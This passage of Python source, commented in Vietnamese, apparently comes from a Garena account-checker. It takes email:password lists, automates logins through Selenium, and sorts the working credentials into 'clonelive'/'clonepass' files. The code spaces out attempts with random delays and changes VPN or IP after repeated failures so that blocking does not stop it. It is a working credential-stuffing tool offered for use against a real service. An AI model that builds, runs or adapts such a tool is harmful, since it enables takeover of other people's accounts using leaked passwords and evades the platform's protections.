                                    except json.JSONDecodeError:
                                        existing_accounts = []
                        added_new = False
                        if account_entry not in existing_accounts:
                            existing_accounts.append(account_entry)
                            self.clonelive_added += 1
                            added_new = True
                        self.clonelive_total_current = len(existing_accounts)
                        with open(clonelive_path, "w", encoding="utf-8") as js_file:
                            json.dump(existing_accounts, js_file, ensure_ascii=False, indent=2)
                        try:
                            with open("clonelive.txt", "w", encoding="utf-8") as txt_file:
                                for entry in existing_accounts:
                                    txt_file.write(f"{entry['username']}:{entry['password']}\n")
                        except Exception as txt_error:
                            self.log_progress(f"Khong ghi duoc clonelive.txt: {txt_error}", Fore.YELLOW)

                        if added_new:
                            self.log_progress("Thêm tài khoản Bình thường clonelive.js.", Fore.GREEN)
                        else:
                            self.log_progress("Thêm tài khoản Bình thường trong clonelive.js.", Fore.YELLOW)
                    except Exception as clone_error:
                        self.log_progress(f"Không thêm tài khoản Bình thuong clonelive.js: {clone_error}", Fore.YELLOW)
                elif any(keyword in normalized_status for keyword in locked_keywords):
                    clonedie_path = "clonedie.js"
                    account_entry = {"username": email, "password": password}
                    try:
                        existing_accounts = []
                        if os.path.exists(clonedie_path):
                            with open(clonedie_path, "r", encoding="utf-8") as js_file:
                                raw_data = js_file.read().strip()
                                if raw_data:
                                    try:
                                        existing_accounts = json.loads(raw_data)
                                        if not isinstance(existing_accounts, list):
                                            existing_accounts = []
                                    except json.JSONDecodeError:
                                        existing_accounts = []
                        added_new = False
                        if account_entry not in existing_accounts:
                            existing_accounts.append(account_entry)
                            added_new = True
                        with open(clonedie_path, "w", encoding="utf-8") as js_file:
                            json.dump(existing_accounts, js_file, ensure_ascii=False, indent=2)
                        try:
                            with open("clonedie.txt", "w", encoding="utf-8") as txt_file:
                                for entry in existing_accounts:
                                    txt_file.write(f"{entry['username']}:{entry['password']}\n")
                        except Exception as txt_error:
                            self.log_progress(f"Khong ghi duoc clonedie.txt: {txt_error}", Fore.YELLOW)

                        if added_new:
                            self.log_progress(" Thêm tài khoản Bị khóa clonedie.js.", Fore.GREEN)
                        else:
                            self.log_progress("Thêm tài khoản Bị khóa trong clonedie.js.", Fore.YELLOW)
                    except Exception as clone_error:
                        self.log_progress(f"Không thể cập nhật tài khoản Bị khóa clonedie.js: {clone_error}", Fore.YELLOW)
                # In ra terminal bằng log_progress
                self.log_progress(f"Thông tin tài khoản {email} || {password}", Fore.CYAN)

                # In từng kết quả (bắt đầu từ results[1] đến results[3])
                if len(results) > 1:
                    self.log_progress(f" {results[1]}")
                if len(results) > 2:
                    self.log_progress(f" {results[2]}")
                if len(results) > 3:
                    self.log_progress(f" {results[3]}")

                # Thông báo trạng thái cuối
                if liveordie_written:
                    self.log_progress("Ghi dữ liệu vào liveordie.txt.", Fore.GREEN)
                return True, "Đăng nhập thành công"

            self.log_progress("URL không đổi sau đăng nhập - đăng nhập thất bại.", Fore.RED)
            return False, "Bị block hoặc gặp captcha"

        except TimeoutException:
            self.log_progress("Quá thời gian chờ tải trang.", Fore.RED)
            return False, "Lỗi: Quá thời gian chờ tải trang"
        except Exception as e:
            self.log_progress(f"Lỗi trong quá trình kiểm tra: {e}", Fore.RED)
            return False, f"Lỗi: {str(e)}"
        finally:
            self.log_progress("Đóng trình duyệt.", Fore.YELLOW)
            driver.quit()

    def process_accounts(self, input_file, output_file):

        """Xu ly danh sach tai khoan va ghi truc tiep vao cac file sau moi lan kiem tra"""

        self.log_progress("Chuẩn bị các file kết quả để ghi dữ liệu.", Fore.YELLOW)

        valid_file = "clonepass.js"

        invalid_file = "cloneunpass.txt"

        notcheck_file = "notcheck.txt"

        if not self._output_files_initialized:
            self.reset_output_files(output_file, valid_file, invalid_file, notcheck_file)
        else:
            self.reset_runtime_stats()
            self.log_progress("Bỏ qua bước reset kết quả, giữ lại dữ liệu hiện tại.", Fore.YELLOW)

        self.ensure_output_file(output_file)

        seen_accounts = set()

        pass_counter = 1

        stop_processing = False



        def load_accounts():

            accounts_list = []

            try:

                with open(input_file, "r", encoding="utf-8") as f:

                    for raw_line in f:

                        line = raw_line.strip()

                        if not line:

                            continue

                        if ":" not in line and "|" in line:

                            line = line.replace("|", ":", 1)

                        if ":" not in line:

                            continue

                        parts = [part.strip() for part in line.split(":", 1)]

                        accounts_list.append(parts)

            except FileNotFoundError:

                self.log_progress(f"Không tìm thấy file {input_file}.", Fore.RED)

                return []

            return accounts_list



        try:

            while True:

                accounts = load_accounts()

                if not accounts:

                    if pass_counter == 1:

                        self.log_progress(

                            f"Không tim thấy tài khoản hợp lệ trong {input_file}.",

                            Fore.YELLOW

                        )

                    else:

                        self.log_progress(

                            "Không còn tài khoản nào để kiểm tra, kết thúc chương trình.",

                            Fore.GREEN

                        )

                    break



                for account in accounts:

                    if len(account) == 2:

                        key = f"{account[0]}:{account[1]}"

                        seen_accounts.add(key)

                self.total_accounts = max(self.total_accounts, len(seen_accounts))



                total = len(accounts)

                if pass_counter == 1:

                    self.log_progress(

                        f"Đã tìm thấy {total} tài khoản để kiểm tra từ {input_file}.",

                        Fore.CYAN

                    )

                    print(f"{Fore.YELLOW}Đang bắt đầu kiểm tra...{Style.RESET_ALL}\n")

                else:

                    self.log_progress(

                        f"Lượt kiểm tra thứ {pass_counter}: {total} tài khoản sẽ được thử lại.",

                        Fore.CYAN

                    )



                pending_invalid_records = []

                invalid_streak = []



                def flush_pending_invalid():

                    nonlocal pending_invalid_records, invalid_streak

                    if not pending_invalid_records:

                        return

                    self.log_progress(

                        f"Đang ghi {len(pending_invalid_records)} tài khoản INVALID đang chờ.",

                        Fore.MAGENTA

                    )

                    for record in pending_invalid_records:

                        email = record["email"]

                        password = record["password"]

                        message = record["message"]

                        with open(notcheck_file, "a", encoding="utf-8") as f:

                            f.write(f"{email}:{password}  ||  {message}\n")

                        with open(output_file, "a", encoding="utf-8") as f:

                            f.write(f"{email}  ||  {password}  ||  INVALID  ||  {message}\n")

                        self.invalid += 1

                        self.checked += 1

                        self.log_progress(

                            f"Cập nhật trạng thái INVALID cho {email}.",

                            Fore.MAGENTA

                        )

                    pending_invalid_records = []

                    invalid_streak = []



                i = 0

                while i < total:

                    account = accounts[i]

                    display_idx = i + 1



                    if len(account) != 2:

                        flush_pending_invalid()

                        self.log_progress(

                            f"[{display_idx}/{total}] Bỏ qua tài khoản không hợp lệ: {':'.join(account)}",

                            Fore.YELLOW

                        )

                        with open(notcheck_file, "a", encoding="utf-8") as f:

                            f.write(f"{':'.join(account)}\n")

                        with open(output_file, "a", encoding="utf-8") as f:

                            f.write(f"{account[0]}  ||  {account[1]}  ||  INVALID  ||  Dữ liệu không hợp lệ\n")

                        self.invalid += 1

                        self.checked += 1

                        i += 1

                        continue



                    email = account[0].strip()

                    password = account[1].strip()

                    self.log_progress(

                        f"[{display_idx}/{total}] Bắt đầu kiểm tra tài khoản {email}",

                        Fore.CYAN

                    )



                    try:

                        success, message = self.check_account(email, password)



                        if success:

                            flush_pending_invalid()

                            self.valid += 1

                            with open(valid_file, "a", encoding="utf-8") as f:

                                f.write(f'{{"username": "{email}", "password": "{password}" }},\n')

                            try:

                                with open("clonepass.txt", "a", encoding="utf-8") as txt_file:

                                    txt_file.write(f"{email}:{password}\n")

                            except Exception as txt_error:

                                self.log_progress(f"Không ghi được clonepass.txt: {txt_error}", Fore.YELLOW)

                            self.log_progress(

                                f"[{display_idx}/{total}] {email} hợp lệ - đã ghi vào {valid_file}.",

                                Fore.GREEN

                            )

                            with open(output_file, "a", encoding="utf-8") as f:

                                f.write(f"{email}  ||  {password}  ||  VALID  ||  {message}\n")

                            self.remove_account_from_source(email, password, input_file)

                            self.checked += 1

                            invalid_streak.clear()



                        else:

                            if message == "SAI_PASS":

                                flush_pending_invalid()

                                self.invalid += 1

                                with open(invalid_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}:{password}\n")

                                self.log_progress(

                                    f"[{display_idx}/{total}] {email} sai mật khẩu  - đã ghi vào {invalid_file}.",

                                    Fore.YELLOW

                                )

                                with open(output_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}  ||  {password}  ||  UNPASS  ||  {message}\n")

                                self.remove_account_from_source(email, password, input_file)

                                self.checked += 1

                                invalid_streak.clear()



                            elif message == "BAN_GARENA":

                                flush_pending_invalid()

                                self.invalid += 1

                                self.remove_account_from_source(email, password, input_file)

                                self.log_progress(

                                    f"[{display_idx}/{total}] {email} bị Garena cấm - đã ghi trạng thái BAN_GARENA.",

                                    Fore.RED

                                )

                                with open(output_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}  ||  {password}  ||  BAN_GARENA  ||  Garena thông báo tự động chuyển hướng\n")

                                self.checked += 1

                                invalid_streak.clear()

                            elif message == "T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a":
                                flush_pending_invalid()
                                self.invalid += 1
                                self.remove_account_from_source(email, password, input_file)
                                self.log_progress(
                                    f"[{display_idx}/{total}] {email} B\u1ecb kh\u00f3a - X\u00f3a kh\u1ecfi accounts.txt.",
                                    Fore.RED
                                )
                                with open(output_file, "a", encoding="utf-8") as f:
                                    f.write(f"{email}  ||  {password}  ||  ACCOUNT_LOCKED  ||  T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a\n")
                                self.checked += 1
                                invalid_streak.clear()
                            elif message == "NOT_INTERNET":

                                flush_pending_invalid()

                                self.invalid += 1

                                with open(notcheck_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}:{password}  ||  {message}\n")

                                self.log_progress(

                                    f"[{display_idx}/{total}] {email} Gặp lỗi mạng - đã ghi vào {notcheck_file}.",

                                    Fore.YELLOW

                                )

                                with open(output_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}  ||  {password}  ||  NOT_INTERNET  ||  {message}\n")

                                self.checked += 1

                                invalid_streak.clear()

                            elif message == "NO_DATA":

                                flush_pending_invalid()

                                self.invalid += 1

                                with open(notcheck_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}:{password}  ||  Không load được dữ liệu\n")

                                self.log_progress(

                                    f"[{display_idx}/{total}] {email} Không load được dữ liệu - đã ghi vào {notcheck_file}.",

                                    Fore.YELLOW

                                )

                                with open(output_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}  ||  {password}  ||  INVALID  ||  Không load được dữ liệu\n")

                                self.checked += 1

                                invalid_streak.clear()



                            elif message == "CANT_LOGIN":

                                flush_pending_invalid()

                                self.invalid += 1

                                self.log_progress(

                                    f"[{display_idx}/{total}] {email} bị chặn dăng nhập - đã xóa khỏi accounts.txt.",

                                    Fore.RED

                                )

                                with open(output_file, "a", encoding="utf-8") as f:

                                    f.write(f"{email}  ||  {password}  ||  CANT_LOGIN  ||  Chặn đăng nhập\n")

                                self.checked += 1

                                invalid_streak.clear()



                            else:

                                invalid_streak.append({"index": i, "email": email, "password": password})

                                pending_invalid_records.append({

                                    "email": email,

                                    "password": password,

                                    "message": message

                                })

                                self.log_progress(

                                    f"[{display_idx}/{total}] {email} tra ve INVALID: {message}",

                                    Fore.RED

                                )



                                if len(invalid_streak) >= 3:

                                    first = invalid_streak[0]["index"]

                                    second = invalid_streak[1]["index"]

                                    third = invalid_streak[2]["index"]

                                    if third == i and second == i - 1 and first == i - 2:

                                        self.log_progress(

                                            "Phát hiện 3 tài khoản INVALID liên tiếp. Kích hoạt quy trình đổi VPN.",

                                            Fore.RED

                                        )

                                        restart_index = first

                                        pending_invalid_records = []

                                        invalid_streak = []

                                        auto_switched = False

                                        if self.enable_auto_vpn:

                                            auto_switched = self.auto_switch_vpn()

                                        if not auto_switched:

                                            self.log_progress(

                                                "Không thể đổi VPN. Chuyển sang đổi thủ công.",

                                                Fore.YELLOW

                                            )

                                            stop_event = threading.Event()

                                            alert_thread = threading.Thread(

                                                target=self.alert_user,

                                                args=(stop_event,),

                                                daemon=True

                                            )

                                            alert_thread.start()

                                            original_ip = self.get_current_ip()

                                            new_ip = self.wait_for_ip_change(

                                                original_ip,

                                                check_interval=0.5

                                            )

                                            stop_event.set()

                                            alert_thread.join()

                                            if new_ip:

                                                self.log_progress(

                                                    f"Tiếp tục kiểm tra, IP sau thay đổi thành {new_ip}.",

                                                    Fore.GREEN

                                                )

                                            else:

                                                self.log_progress(

                                                    "Tiếp tục kiểm tra dữ liệu dù không xác định được IP mới.",

                                                    Fore.YELLOW

                                                )

                                        else:

                                            self.log_progress(

                                                "VPN đã được đổi tự động, tiếp tục kiểm tra.",

                                                Fore.GREEN

                                            )

                                        self.log_progress(

                                            f"Quay lại kiểm tra tài khoản thứ {restart_index + 1}.",

                                            Fore.YELLOW

                                        )

                                        i = restart_index

                                        continue



                        i += 1

                        delay = random.uniform(3, 6)

                        self.log_progress(f"Nghỉ {delay:.2f} giây trước khi kiểm tra tài khoản tiếp theo.", Fore.YELLOW)

                        self.log_progress("", Fore.YELLOW)

                        self.log_progress("", Fore.YELLOW)

                        self.log_progress("", Fore.YELLOW)

                        time.sleep(delay)



                    except KeyboardInterrupt:

                        flush_pending_invalid()

                        self.log_progress("Người dùng dừng chương trình!", Fore.RED)

                        with open(notcheck_file, "a", encoding="utf-8") as f:

                            f.write(f"{email}:{password}\n")

                        with open(output_file, "a", encoding="utf-8") as f:

                            f.write(f"{email}  ||  {password}  ||  INVALID  ||  Người dùng dừng chương trình\n")

                        stop_processing = True

                        break



                flush_pending_invalid()

                if stop_processing:

                    break



                pass_counter += 1

                self.log_progress("Đã hoàn thành lượt kiểm tra, đang nạp lại accounts.txt...", Fore.CYAN)



        except Exception as e:

            error_msg = f"Lỗi tổng: {str(e)}"

            self.log_progress(error_msg, Fore.RED)

            with open(notcheck_file, "a", encoding="utf-8") as f:

                f.write(f"{error_msg}\n")

            with open(output_file, "a", encoding="utf-8") as f:

                f.write(f"{error_msg}\n")



    def save_results(self, output_file):
        """Lưu kết quả ra file với định dạng: Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo"""
        self.log_progress("Đang lưu kết quả tổng hợp.", Fore.YELLOW)
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo\n")
                for row in self.results:
                    if row[2] == "VALID":
                        f.write(f"{row[0]}  ||  {row[1]}  ||  VALID    ||  {row[3]}\n")
                    else:
                        f.write(f"{row[0]}  ||  {row[1]}  ||  {row[2]}  ||  {row[3]}\n")

            self.log_progress(f"Đã lưu kết quả vào {output_file}.", Fore.GREEN)
            print(f"\n{Fore.GREEN}=== KẾT QUẢ KIỂM TRA ===")
            print(f"Tổng số tài khoản đã kiểm tra: {self.checked}")
            print(f"{Fore.GREEN}Tài khoản hợp lệ: {self.valid}")
            print(f"{Fore.RED}Tài khoản không hợp lệ: {self.invalid}")
            print(f"{Fore.YELLOW}Kết quả đã được lưu vào file: {output_file}{Style.RESET_ALL}")

        except Exception as e:
            self.log_progress(f"Lỗi khi lưu kết quả: {str(e)}", Fore.RED)
            print(f"\n{Fore.RED}Lỗi khi lưu kết quả: {str(e)}{Style.RESET_ALL}")

def main():
   print(f"""{Fore.CYAN}
  _______              _     ____              
 |__   __|            | |   |  _ \             
    | | ___   ___   __| |   | |_) | _   _ 
    | |/ _ \ / _ \ / _` |   |  _ < | | | |
    | | (_) | (_) | (_| |   | |_) || |_| |
    |_|\___/ \___/ \__,_|   |____/  \__, |
                                     __/ |
                                    |___/ 
         __          __   _____  
         \ \        / /  / ____| 
          \ \  /\  / /  | (___   
           \ \/  \/ /   \\\___ \  
            \  /\  /     |___) | 
             \/  \/     /_____/  

    {Style.RESET_ALL}""")


input_file = "accounts.txt"
output_file = "results.csv"

print(f"{Fore.YELLOW}Đang khởi tạo công cụ kiểm tra tài khoản Garena...{Style.RESET_ALL}")
checker = GarenaAccountChecker()
checker.log_progress("Bắt đầu quy trình kiểm tra tài khoản.", Fore.YELLOW)
checker.process_accounts(input_file, output_file)
clonelive_path = "clonelive.js"
try:
    if os.path.exists(clonelive_path):
        with open(clonelive_path, "r", encoding="utf-8") as js_file:
            raw_data = js_file.read().strip()
        if raw_data:
            data = json.loads(raw_data)
            if isinstance(data, list):
                checker.clonelive_total_current = len(data)
            else:
                checker.clonelive_total_current = 0
        else:
            checker.clonelive_total_current = 0
    else:
        checker.clonelive_total_current = 0
except Exception as summary_error:
    checker.log_progress(f"Không đọc được clonelive.js để tổng kết: {summary_error}", Fore.YELLOW)
    checker.clonelive_total_current = 0
checker.log_progress(f"Tổng kết clonelive.js: {checker.clonelive_added}/{checker.total_accounts} tài khoản mới ghi (tổng hiện có: {checker.clonelive_total_current}).", Fore.CYAN)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Đã dừng chương trình do người dùng yêu cầu.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Có lỗi không mong muốn: {str(e)}{Style.RESET_ALL}")